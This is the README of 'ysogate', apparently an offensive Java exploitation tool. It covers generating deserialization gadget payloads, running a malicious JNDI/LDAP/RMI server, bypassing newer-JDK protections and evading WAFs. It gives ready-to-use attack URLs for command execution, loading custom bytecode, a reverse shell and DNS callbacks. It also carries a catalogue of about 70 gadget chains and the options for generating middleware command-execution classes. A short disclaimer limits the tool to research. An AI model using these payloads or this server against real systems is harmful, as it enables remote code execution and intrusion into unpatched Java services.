# ysogate

ysogate是一个java综合利用工具，支持JNDI注入相关利用，包含多种高版本jdk绕过方式，且支持片段化gadget生成和组合。

- 生成多种Java反序列化gadget payload
- 支持JNDI/LDAP/RMI/JRMP等多种利用方式
- 灵活的命令行界面，支持多种操作模式
- 可扩展的架构，便于添加新的gadget和攻击向量
- 支持多种高版本jdk绕过方式
- 支持扩展利用方式，如内存马，回显，代理等

## Usage

分为两种模式，指定`-m jndi`来启动 JNDI Server，指定`-m payload`来生成反序列化payload，指定`-m gen`来生成恶意类

```bash
[root]#~  H4cking to the Gate !
[root]#~  Usage:
[root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
[root]#~  JNDI    Mode: java -jar ysogate-[version]-all.jar -m jndi    [JNDI OPTIONS]
[root]#~  Gen     Mode: java -jar ysogate-[version]-all.jar -m gen     [GEN OPTIONS]
```
## Gen Mode

可以使用`-m gen`来使用gen模式，用于生成恶意类

```
[root]#~  Gen Mode Options:
 -bypass                   ByPass JDK Module
 -f,--format <arg>         Output format
 -h,--help                 Show help message
 -m,--mode <arg>           Operation mode: 'payload' or 'jndi' or 'gen'
 -name,--classname <arg>   Evil Class Name
 -s,--sink <arg>           Evil sink template
 -t,--type <arg>           Middleware type
```

示例，生成springmvc的命令执行回显，添加-bypass绕过jdk高版本限制，适用于jdk17

```
java -jar ysogate-[version]-all.jar -m gen -t springmvc -s CmdExec -name org.springframework.expression.Evil -bypass
```

以下是支持的中间件/框架以及执行模式

| 中间件/框架 | 执行模式          |
| ----------- | ----------------- |
| springmvc   | CmdExec，CodeExec |
| tomcat      | CmdExec，CodeExec |
| resin       | CmdExec，CodeExec |
| weblogic    | CmdExec，CodeExec |
| jetty       | CmdExec，CodeExec |
| websphere   | CmdExec，CodeExec |
| undertow    | CmdExec，CodeExec |
| glassfish   | CmdExec，CodeExec |
| struts2     | CmdExec，CodeExec |

## JNDI Mode

可以使用`-m jndi`来使用jndi模式，这个模式会在本地运行恶意的jndi服务器

```
[root]#~  JNDI Mode Options:
 -h,--help              Show help message
 -hp,--httpPort <arg>   HTTP port
 -i,--ip <arg>          IP address for JNDI server
 -ldap2rmi              change ldap to rmi to bypass trustSerialData
 -lp,--ldapPort <arg>   LDAP port
 -m,--mode <arg>        Operation mode: 'payload' or 'jndi' or 'gen'
 -onlyRef               use Reference only to bypass trustSerialData
 -rp,--rmiPort <arg>    RMI port
```

例如

```
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
```

### trustSerialData 绕过

在JDK20+版本中`com.sun.jndi.ldap.object.trustSerialData`属性默认为`false`，无法在com.sun.jndi.ldap.Obj#decodeObject中反序列化，绕过方式主要有：

**ldap2rmi**

通过设置javaRemoteLocation来使用com.sun.jndi.ldap.Obj#decodeRmiObject还原Factory对象，从ldap转换成rmi进行绕过

可以在启动时添加`-ldap2rmi`来进行可能的绕过，例如

```
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -ldap2rmi
```

**onlyRef**

利用本地Factory进行攻击时，可以通过设置`objectClass`为`javaNamingReference`来避免进行反序列化，利用decodeReference来还原Factory对象，不适用于BeanFactory绕过，因为BeanFactory需要ResourceRef类型。

可以在启动时添加`-onlyRef`来进行可能的绕过，例如

```
java -jar ysogate-[version]-all.jar -m jndi -i 0.0.0.0 -onlyRef
```

### codebase 注入

ldap和rmi通用，通过 JNDI Reference 指定codebase，远程加载ObjectFactory，需要trustURLCodebase=true，

```
# 参数支持urlsafe base64
ldap://127.0.0.1:1389/Basic/xxxxxxx/Y2FsYw==

# 执行命令
ldap://127.0.0.1:1389/Basic/Command/calc

# Dnslog
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn

# 加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/data:yv66vxxxxxxxxxxxxx

# 从/tmp/a.class加载自定义字节码
ldap://127.0.0.1:1389/Basic/Custom/file:L3RtcC9hLmNsYXNz

# 加载内存马(todo)
ldap://127.0.0.1:1389/Basic/Custom/mem:Tomcat

# 原生反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
```

### 基于 BeanFactory

BeanFactory这个类在tomcat8+或者SpringBoot 1.2.x+存在

且要求tomcat版本小于9.0.63，或小于8.5.79

**Tomcat ELProcessor**

利用javax.el.ELProcessor#eval

```
# 使用方式同Basic

# 使用el调用ScriptEngineManager来加载字节码(nashorn在JDK15后被移除)
ldap://127.0.0.1:1389/ELProcessor/Command/calc
ldap://127.0.0.1:1389/ELProcessor/Custom/data:yv66vxxxxxxxxxxxxx

# jdk9以上可以用el调用JShell来加载字节码
ldap://127.0.0.1:1389/ELProcessor17/Command/calc
```

**GroovyShell & GroovyClassLoader**

利用groovy.lang.GroovyShell#evaluate和groovy.lang.GroovyClassLoader#parseClass(java.lang.String)

```**SnakeYaml**
# 使用方式同Basic
ldap://127.0.0.1:1389/GroovyClassLoader/Command/calc
ldap://127.0.0.1:1389/GroovyShell/Command/calc
```

**SnakeYaml**

利用org.yaml.snakeyaml.Yaml#load(java.lang.String)

```
# 使用方式同Basic
ldap://127.0.0.1:1389/SnakeYaml/Command/calc
```

**XStream**

利用com.thoughtworks.xstream.XStream#fromXML(java.net.URL)

可以打CVE-2021-39149，要求XStream < 1.4.18

```
# 暂时只写了执行命令
ldap://127.0.0.1:1389/XStream/calc
```

**MLet**

通过 MLet 探测 classpath 中存在的类

```
ldap://127.0.0.1:1389/MLet/com.example.TestClass
```

如果 `com.example.TestClass` 这个类存在, 则 HTTP 服务器会接收到一个 `/com/example/TestClass_exists.class` 请求

**NativeLibLoader**

利用com.sun.glass.utils.NativeLibLoader#loadLibrary加载目标服务器上的动态链接库，适用于能够写文件的场景

写入dll/so/dylib文件，例如/tmp/evil.so，使用时把路径去掉后缀， 即/tmp/evil

```
ldap://127.0.0.1:1389/NativeLibLoader/L3RtcC9ldmls
```
**JSVGCanvas**
高版本tomcat下通过GenericNamingResourcesFactory来调用setter，触发 org.apache.batik.swing.JSVGCanvas#setURI，需要TomcatJDBC，batik-swing 1.15以下，适用于高版本TomcatBypass
```
ldap://127.0.0.1:1389/JSVGCanvas/Command/calc
```
### JDBC RCE

支持以下数据库连接池

- Commons DBCP
- Tomcat DBCP
- Tomcat JDBC
- Alibaba Druid
- HikariCP
- C3P0

支持以下数据库

- Mysql
- PostgreSQL
- H2
- IBM DB2
- Derby
- Teradata

### 反序列化

通过反序列化来进行RCE，暂不支持rmi协议

```
# 执行命令
ldap://127.0.0.1:1389/Deserialize/{gadget}/Command/{cmd}

# 加载自定义字节码（部分需要继承AbstractTranslet）
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/data:yv66vxxxxxxxxxxxxx

# 从/tmp/a.class加载自定义字节码（部分需要继承AbstractTranslet）
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/file:L3RtcC9hLmNsYXNz

# 加载内存马(todo)
ldap://127.0.0.1:1389/Deserialize/{gadget}/Custom/mem:Tomcat

# example
ldap://127.0.0.1:1389/Deserialize/Jackson2/Command/calc
```

## Payload Mode

可以使用`-m payload`来使用payload模式，这个模式下会生成自定义的反序列化payload，例如

```
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p calc -b64
```

完整用法如下

```bash
[root]#~  H4cking to the Gate !
[root]#~  Usage:
[root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
[root]#~  JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]

[root]#~  Payload Mode Options:
 -b64,--base64           Encode Output into base64
 -f,--file <arg>         Write Output into FileOutputStream (Specified FileName)
 -g,--gadget <arg>       Java deserialization gadget
 -h,--help               Show help message
 -m,--mode <arg>         Operation mode: 'payload' or 'jndi'
 -ol,--overlong          Use overlong UTF-8 encoding
 -p,--parameters <arg>   Gadget parameters


[root]#~  Available payload types:
00:40:55.537 [main] INFO org.reflections.Reflections - Reflections took 63 ms to scan 1 urls, producing 22 keys and 233 values
     Payload                                     Dependencies                                                                                                                                                                                        
     -------                                     ------------                                                                                                                                                                                        
     AspectJWeaver                               aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     AspectJWeaver2                              aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1                                  bsh:2.0b5                                                                                                                                                                                           
     BeanShell20b4                               bsh:2.0b4                                                                                                                                                                                           
     C3P0                                        c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     C3P02                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35                                                                                                                                            
     C3P03                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9                                                                                                                              
     C3P04                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30                                                                                                                            
     C3P092                                      c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11                                                                                                                                   
     Click1                                      click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure                                     clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1                           commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsBeanutils1183NOCC                    commons-beanutils:1.8.3                                                                                                                                                                             
     CommonsBeanutils2                           commons-beanutils:1.9.2                                                                                                                                                                             
     CommonsBeanutils2183NOCC                    commons-beanutils:1.8.3, commons-logging:1.2                                                                                                                                                        
     CommonsBeanutils3                           commons-beanutils:1.9.2, commons-collections:3.1                                                                                                                                                    
     CommonsBeanutils3183                        commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsBeanutils4                           commons-beanutils:1.9.2, commons-collections:3.1                                                                                                                                                    
     CommonsBeanutilsAttrCompare                 commons-beanutils:1.9.2                                                                                                                                                                             
     CommonsBeanutilsAttrCompare183              commons-beanutils:1.8.3                                                                                                                                                                             
     CommonsBeanutilsObjectToStringComparator    commons-beanutils:1.9.2, commons-lang3:3.10                                                                                                                                                         
     CommonsBeanutilsObjectToStringComparator183 commons-beanutils:1.8.3, commons-lang3:3.10                                                                                                                                                         
     CommonsBeanutilsPropertySource              commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                                          
     CommonsBeanutilsPropertySource183           commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                                          
     CommonsCollections1                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections10                        commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollections11                                                                                                                                                                                                                            
     CommonsCollections12                        commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollections2                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6Lite                     commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections8                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections9                         commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollectionsK1                        commons-collections:<=3.2.1                                                                                                                                                                         
     CommonsCollectionsK2                        commons-collections4:4.0                                                                                                                                                                            
     Fastjson1                                   <=1.2.xx                                                                                                                                                                                            
     Fastjson2                                   <=2.0.26?                                                                                                                                                                                           
     FileUpload1                                 commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1                                     groovy:2.3.9                                                                                                                                                                                        
     Hibernate1                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                                     
     Hibernate2                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                                     
     JBossInterceptors1                          javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRE8u20                                                                                                                                                                                                                                         
     JRE8u20_2                                                                                                                                                                                                                                       
     JRMPClient                                                                                                                                                                                                                                      
     JRMPClient_Activator                                                                                                                                                                                                                            
     JRMPClient_Obj                                                                                                                                                                                                                                  
     JRMPListener                                                                                                                                                                                                                                    
     JSON1                                       json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson1                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE                                                                                                                                                   
     Jackson2                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE                                                                                                                                                   
     JavassistWeld1                              javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21                                                                                                                                                                                                                                         
     Jdk7u21variant                                                                                                                                                                                                                                  
     Jython1                                     jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1                               js:1.7R2                                                                                                                                                                                            
     MozillaRhino2                               js:1.7R2                                                                                                                                                                                            
     Myfaces1                                                                                                                                                                                                                                        
     Myfaces2                                    myfaces-impl:2.2.9, myfaces-api:2.2.9, apache-el:8.0.27, javax.servlet-api:3.1.0, mockito-core:1.10.19, hamcrest-core:1.1, objenesis:2.1                                                            
     ROME                                        rome:1.0                                                                                                                                                                                            
     ROME2                                       rome:1.0                                                                                                                                                                                            
     ROME3                                       rome:1.0                                                                                                                                                                                            
     SignedObject                                                                                                                                                                                                                                    
     Spring1                                     spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2                                     spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     Spring3                                     spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2                                                                                                                    
     URLDNS                                                                                                                                                                                                                                          
     Vaadin1                                     vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1                                     wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                 
     XStream39144                                Xstream:<1.4.18                                                                                                                                                                                     
     XStream39149                                Xstream:<1.4.18                                                                                                                                                                                     

```

## Todo
- [x] 基础的反序列化生成payload
- [x] 增加JNDI/LDAP/RMI/JRMP等利用方式
- [x] 绕过trustSerialData
- [ ] 完善第三方库的gadget
- [x] 添加中间件回显
- [ ] 在加载字节码方面增加扩展攻击如回显，内存马，代理等
- [ ] 补充RMI反序列化的利用
- [x] 防护绕过方面的补充，增加OverlongUTF8/脏数据等绕过



## 免责声明
本项目仅面向安全研究与学习，禁止任何非法用途

如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果

除非您已充分阅读、完全理解并接受本协议，否则，请您不要使用本项目



## Reference

 - https://github.com/frohoff/ysoserial
 - https://github.com/X1r0z/JNDIMap
 - https://tttang.com/archive/1405/